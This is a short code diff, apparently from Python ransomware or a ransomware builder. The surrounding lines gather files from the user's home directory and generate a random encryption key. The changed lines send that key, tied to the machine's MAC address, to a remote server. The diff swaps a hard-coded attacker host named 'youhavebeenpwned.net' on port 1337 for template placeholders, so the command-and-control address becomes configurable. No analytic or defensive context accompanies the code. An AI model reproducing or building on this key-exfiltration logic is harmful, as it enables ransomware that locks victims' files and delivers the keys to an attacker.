@@ -180,7 +180,7 @@ files = get_files_recursive(home_dir)
 key = secrets.SystemRandom().randbytes(16)
 mac = uuid.getnode().to_bytes(6, 'big')
 
-conn = socket.create_connection(('youhavebeenpwned.net', 1337))
+conn = socket.create_connection(('{{remote_addr}}', {{remote_port}}))
 conn.send(rsa_pub_encrypt(mac + key, e, n))
 conn.close()
 
